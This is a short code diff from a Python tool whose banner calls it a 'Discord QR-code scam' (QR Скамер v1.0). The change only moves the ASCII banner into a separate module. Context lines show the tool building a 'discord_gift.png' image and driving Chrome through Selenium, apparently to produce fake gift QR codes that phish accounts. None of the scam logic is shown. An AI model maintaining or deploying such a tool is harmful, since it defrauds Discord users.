@@ -4,6 +4,7 @@ from PIL import Image
 import base64
 import time
 import os
+from banner import BANNER
 
 # By Jupiter404E
 
@@ -21,14 +22,7 @@ def paste_template():
     im1.save('discord_gift.png', quality=95)
 
 def main():
-    print(" ____  _                       _     ___  ____                     _")
-    print("|  _ \(_)___  ___ ___  _ __ __| |   / _ \|  _ \       ___ ___   __| | ___    ___  ___ __ _ _ __ ___")
-    print("| | | | / __|/ __/ _ \| '__/ _` |  | | | | |_) |____ / __/ _ \ / _` |/ _ \  / __|/ __/ _` | '_ ` _ \\")
-    print("| |_| | \__ \ (_| (_) | | | (_| |  | |_| |  _ <_____| (_| (_) | (_| |  __/  \__ \ (_| (_| | | | | | |")
-    print("|____/|_|___/\___\___/|_|  \__,_|   \__\_\_| \_\     \___\___/ \__,_|\___|  |___/\___\__,_|_| |_| |_|")
-    print("                                                                                                     ")
-    print("                              ▬▬▬  QR Скамер v1.0  ▬▬▬                                               ")
-    print("                              ▬▬▬  By Jupiter404E  ▬▬▬                                             \n")
+    print(BANNER)
 
     options = webdriver.ChromeOptions()
     options.add_experimental_option('excludeSwitches', ['enable-logging'])
